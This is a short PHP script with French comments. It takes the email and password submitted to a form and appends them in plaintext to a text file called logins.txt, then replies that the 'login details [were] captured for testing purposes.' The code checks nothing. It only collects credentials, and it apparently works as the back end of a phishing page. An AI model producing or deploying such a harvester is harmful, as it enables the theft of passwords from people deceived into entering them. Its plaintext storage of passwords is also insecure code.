<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);

    // Pour les tests, on pourrait écrire les données dans un fichier texte ou une base de données.
    // Assurez-vous que ces informations sont bien sécurisées et protégées.

    $file = 'logins.txt';
    $data = "Username: $username, Password: $password\n";
    file_put_contents($file, $data, FILE_APPEND);

    echo "Login details captured for testing purposes.";
} else {
    echo "Invalid request.";
}
?>
